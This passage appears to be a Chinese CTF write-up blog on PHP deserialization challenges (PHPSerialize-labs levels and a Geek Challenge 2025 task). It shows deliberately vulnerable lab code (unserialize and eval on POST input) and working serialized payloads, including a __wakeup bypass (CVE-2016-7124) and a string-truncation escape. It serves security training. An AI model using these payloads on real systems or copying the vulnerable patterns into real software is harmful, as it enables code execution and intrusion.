class="string">&quot;FLAG&#123;TEST&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Class B is a class with 3 properties: &#x27;&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">B</span>()).<span class="string">&quot;&#x27;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseString</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">B</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseString</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="variable">$serliseString</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After replace B with A,we unserialize it and dump :&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$serliseString</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> <span class="keyword">instanceof</span> A &amp;&amp; <span class="variable">$a</span>-&gt;helloctfcmd == <span class="string">&quot;get_flag&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;what&#x27;s rule?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">Class A is <span class="literal">NULL</span>: <span class="string">&#x27;O:1:&quot;A&quot;:0:&#123;&#125;&#x27;</span></span><br><span class="line">Class B is a <span class="class"><span class="keyword">class</span> <span class="title">with</span> 3 <span class="title">properties</span>: &#x27;<span class="title">O</span>:1:&quot;<span class="title">B</span>&quot;:3:</span>&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Hello&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;*b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;CTF&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Bc&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;FLAG&#123;TEST&#125;&quot;</span>;&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">After replace B with A,we unserialize it and dump :</span></span><br><span class="line"><span class="string">object(A)#1 (3) &#123; [&quot;a&quot;]=&gt; string(5) &quot;Hello&quot; [&quot;b&quot;:protected]=&gt; string(3) &quot;CTF&quot; [&quot;c&quot;:&quot;A&quot;:private]=&gt; string(10) &quot;FLAG&#123;TEST&#125;&quot; &#125;</span></span><br></pre></td></tr></table></figure><p>更改B的属性后将名称替换为A即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&quot;CTF&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="string">&quot;FLAG&#123;TEST&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$helloctfcmd</span>=<span class="string">&quot;get_flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">B</span>());</span><br></pre></td></tr></table></figure><p>得到<code>O:1:&quot;B&quot;:4:{s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:4:&quot; * b&quot;;s:3:&quot;CTF&quot;;s:4:&quot; B c&quot;;s:10:&quot;FLAG{TEST}&quot;;s:11:&quot;helloctfcmd&quot;;s:8:&quot;get_flag&quot;;}</code></p><p>修改传递<code>o=O:1:&quot;A&quot;:4:{s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:4:&quot; * b&quot;;s:3:&quot;CTF&quot;;s:4:&quot; B c&quot;;s:10:&quot;FLAG{TEST}&quot;;s:11:&quot;helloctfcmd&quot;;s:8:&quot;get_flag&quot;;}</code>即可</p><br /><h3 id="字符串尾部判定：进行反序列化时，当成员属性的数量，名称长度，内容长度均一致时，程序会以-“-”-作为字符串的结尾判定"><a href="#字符串尾部判定：进行反序列化时，当成员属性的数量，名称长度，内容长度均一致时，程序会以-“-”-作为字符串的结尾判定" class="headerlink" title="字符串尾部判定：进行反序列化时，当成员属性的数量，名称长度，内容长度均一致时，程序会以 “;}” 作为字符串的结尾判定"></a>字符串尾部判定：进行反序列化时，当成员属性的数量，名称长度，内容长度均一致时，程序会以 “;}” 作为字符串的结尾判定</h3><h4 id="PHPSerializelabs-Level-18-字符串逃逸基础-尾部判定"><a href="#PHPSerializelabs-Level-18-字符串逃逸基础-尾部判定" class="headerlink" title="[PHPSerializelabs]Level 18: 字符串逃逸基础-尾部判定"></a>[PHPSerializelabs]Level 18: 字符串逃逸基础-尾部判定</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 18 : 字符串逃逸基础 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">序列化和反序列化的规则特性,字符串尾部判定：进行反序列化时，当成员属性的数量，名称长度，内容长度均一致时，程序会以 &quot;;&#125;&quot; 作为字符串的结尾判定。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&quot;CTF&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span> = <span class="string">&#x27;GET_FLAG&quot;;&#125;FAKE_FLAG&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseStringDemo</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Demo</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line"><span class="variable">$change</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;change&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseStringFLAG</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$target</span>, <span class="variable">$change</span>, <span class="variable">$serliseStringDemo</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$FLAG</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serliseStringFLAG</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$FLAG</span> <span class="keyword">instanceof</span> FLAG &amp;&amp; <span class="variable">$FLAG</span>-&gt;key == <span class="string">&#x27;GET_FLAG&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line">SerliseStringDemo:<span class="string">&#x27;O:4:&quot;Demo&quot;:3:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;s:3:&quot;CTF&quot;;s:3:&quot;key&quot;;s:20:&quot;GET_FLAG&quot;;&#125;FAKE_FLAG&quot;;&#125;&#x27;</span></span><br><span class="line">Change SOMETHING TO GET FLAGYour serliaze <span class="keyword">string</span> is O:<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Hello&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;CTF&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;GET_FLAG&quot;</span>;&#125;FAKE_FLAG<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">And Here is object(Demo)#1 (3) &#123; [&quot;</span>a<span class="string">&quot;]=&gt; string(5) &quot;</span>Hello<span class="string">&quot; [&quot;</span>b<span class="string">&quot;]=&gt; string(3) &quot;</span>CTF<span class="string">&quot; [&quot;</span>key<span class="string">&quot;]=&gt; string(20) &quot;</span>GET_FLAG<span class="string">&quot;;&#125;FAKE_FLAG&quot;</span> &#125;</span><br></pre></td></tr></table></figure><p>利用这个特性进行截断，只需要把对象名<code>&quot;Demo&quot;</code>替换为<code>&quot;FLAG&quot;</code>，字符数<code>20</code>替换为<code>8</code>即可</p><p>传递<code>target=O:4:&quot;Demo&quot;:3:{s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;s:3:&quot;CTF&quot;;s:3:&quot;key&quot;;s:20:&quot;GET_FLAG&quot;;}FAKE_FLAG&quot;;}</code></p><p><code>&amp;change=O:4:&quot;FLAG&quot;:3:{s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;s:3:&quot;CTF&quot;;s:3:&quot;key&quot;;s:8:&quot;GET_FLAG&quot;;}</code></p><p>获得flag</p><br /><h3 id="当序列化字符串中对象属性的值大于真实属性值时便会跳过-wakeup的执行"><a href="#当序列化字符串中对象属性的值大于真实属性值时便会跳过-wakeup的执行" class="headerlink" title="当序列化字符串中对象属性的值大于真实属性值时便会跳过__wakeup的执行"></a>当序列化字符串中对象属性的值大于真实属性值时便会跳过__wakeup的执行</h3><h4 id="PHPSerializelabs-Level-11-wakeup-CVE-2016-7124"><a href="#PHPSerializelabs-Level-11-wakeup-CVE-2016-7124" class="headerlink" title="[PHPSerializelabs]Level 11: __wakeup() CVE-2016-7124"></a>[PHPSerializelabs]Level 11: __wakeup() CVE-2016-7124</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 11 : Bypass weakup! --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CVE-2016-7124 - PHP5 &lt; 5.6.25 / PHP7 &lt; 7.0.10</span></span><br><span class="line"><span class="comment">在该漏洞中，当序列化字符串中对象属性的值大于真实属性值时便会跳过__wakeup的执行。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&quot;FAKEFLAG&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;sorry,flag is gone!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要掠过<code>__wakeup()</code>方法的调用，结合hint，对象属性的值大于真实属性值时便会跳过wakeup的执行，先构造序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&quot;FAKEFLAG&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;sorry,flag is gone!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$flag</span>);</span><br></pre></td></tr></table></figure><p>得出的序列化字符串：<code>O:4:&quot;FLAG&quot;:1:{s:4:&quot;flag&quot;;s:8:&quot;FAKEFLAG&quot;;}</code></p><p>修改属性数值得到新字符串<code>O:4:&quot;FLAG&quot;:2:{s:4:&quot;flag&quot;;s:8:&quot;FAKEFLAG&quot;;}</code>传递即可</p><br /><h3 id="GC机制"><a href="#GC机制" class="headerlink" title="GC机制"></a>GC机制</h3><h4 id="PHPSerializelabs-Level-8-构造函数和析构函数以及GC机制"><a href="#PHPSerializelabs-Level-8-构造函数和析构函数以及GC机制" class="headerlink" title="[PHPSerializelabs]Level 8: 构造函数和析构函数以及GC机制"></a>[PHPSerializelabs]Level 8: 构造函数和析构函数以及GC机制</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 8 : 构造函数和析构函数 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：注意顺序和次数</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$destruct_flag</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$construct_flag</span>;</span><br><span class="line"><span class="variable">$destruct_flag</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$construct_flag</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$class_name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;class_name = <span class="variable">$class_name</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$construct_flag</span>;</span><br><span class="line">        <span class="variable">$construct_flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Constructor called &quot;</span> . <span class="variable">$construct_flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$destruct_flag</span>;</span><br><span class="line">        <span class="variable">$destruct_flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Destructor called &quot;</span> . <span class="variable">$destruct_flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Object created*/</span></span><br><span class="line"><span class="variable">$demo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>(<span class="string">&#x27;demo&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">/*Object serialized*/</span></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$demo</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Object unserialized*/</span></span><br><span class="line"><span class="variable">$n</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">/*unserialized object destroyed*/</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$n</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*original object destroyed*/</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$demo</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*注意 此处为了方便演示为手动释放，一般情况下，当脚本运行完毕后，php会将未显式销毁的对象自动销毁，该行为也会调用析构函数*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*此外 还有比较特殊的情况: PHP的GC(垃圾回收机制)会在脚本运行时自动管理内存，销毁不被引用的对象:*/</span></span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line">Object created:Constructor called <span class="number">1</span></span><br><span class="line">Object serialized: But Nothing <span class="title function_ invoke__">Happen</span>(:</span><br><span class="line">Object <span class="attr">unserialized</span>:But nothing happened either):</span><br><span class="line">serialized Object destroyed:Destructor called <span class="number">1</span></span><br><span class="line">original Object destroyed:Destructor called <span class="number">2</span></span><br><span class="line"></span><br><span class="line">This <span class="keyword">object</span> (<span class="string">&#x27;new FLAG();&#x27;</span>) will be destroyed immediately because it is not assigned to any variable:Constructor called <span class="number">2</span></span><br><span class="line">Destructor called <span class="number">3</span></span><br><span class="line"></span><br><span class="line">Now Your Turn!, Try to get the flag!</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RELFLAG</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Constructor called &quot;</span> . <span class="variable">$flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Destructor called &quot;</span> . <span class="variable">$flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag</span> &gt; <span class="number">5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;HelloCTF&#123;???&#125;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Check Detected flag is &quot;</span>. <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">check</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>code=unserialize(serialize(unserialize(serialize(unserialize(serialize(unserialize(serialize(new RELFLAG()))))))));</code></p><p>利用嵌套序列化&#x2F;反序列化触发GC机制，<code>serialize()</code>、<code>unserialize()</code>这里重复调用产生了多个对象（析构），但是并没有调用<code>__construct()</code>和<code>__destruct()</code>方法，使<code>$flag</code>数值增加的原因是GC机制</p><br /><h4 id="极客大挑战2025-popself"><a href="#极客大挑战2025-popself" class="headerlink" title="[极客大挑战2025]popself"></a>[极客大挑战2025]popself</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">有同学跟我说他只会做一个类的php反序列化题，那来试试看</span><br></pre></td></tr></table></figure><br /><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">All_in_one</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KiraKiraAyu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_4ak5ra</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$K4per</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Sams</span>āra;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$komiko</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Fox</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Eureka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QYQS</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sleep3r</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ivory</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;他还是没有忘记那个&quot;</span>.<span class="variable">$value</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>; <span class="comment">//此处不是__toString的触发点，这里$value不是对象是字符串</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;收集夏日的碎片吧&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fox</span> = <span class="variable language_">$this</span>-&gt;Fox;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( !(<span class="variable">$fox</span> <span class="keyword">instanceof</span> All_in_one) &amp;&amp; <span class="variable">$fox</span>()===<span class="string">&quot;summer&quot;</span>)&#123; <span class="comment">//绕过点</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;QYQS enjoy summer&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;开启循环吧&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$komiko</span> = <span class="variable language_">$this</span>-&gt;komiko;</span><br><span class="line">            <span class="variable">$komiko</span>-&gt;<span class="title function_ invoke__">Eureka</span>(<span class="variable">$this</span>-&gt;L, <span class="variable">$this</span>-&gt;sleep3r); <span class="comment">//Eureka为不存在的方法，触发__call</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;恭喜成功signin!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;welcome to Geek_Challenge2025!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;Samsāra;</span><br><span class="line">        <span class="variable">$arg</span> = <span class="variable language_">$this</span>-&gt;ivory;</span><br><span class="line">        <span class="variable">$f</span>(<span class="variable">$arg</span>); <span class="comment">//利用点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你能让K4per和KiraKiraAyu组成一队吗&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;K4per)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ 